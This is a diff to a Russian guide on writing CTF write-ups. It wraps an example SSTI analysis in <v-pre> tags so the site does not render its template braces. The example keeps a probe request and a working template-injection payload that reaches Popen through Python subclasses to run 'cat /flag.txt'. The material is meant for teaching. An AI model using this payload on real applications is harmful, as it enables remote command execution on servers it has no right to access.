@@ -858,6 +858,8 @@ Write-up — это технический отчёт о решении зада
 ```markdown
 ### Анализ SSTI payload
 
+<v-pre>
+
 Обнаружив параметр `name`, отражающийся в странице, я проверил SSTI:
 
 ```
@@ -882,7 +884,7 @@ GET /greet?name={{7*7}} HTTP/1.1
 ```
 {{''.__class__.__bases__[0].__subclasses__()[258](['cat','/flag.txt'],stdout=-1).communicate()[0]}}
 ```
-
+</v-pre>
 Это вызывает `Popen(['cat','/flag.txt'], stdout=PIPE).communicate()`,
 возвращая содержимое файла с флагом.
 ```
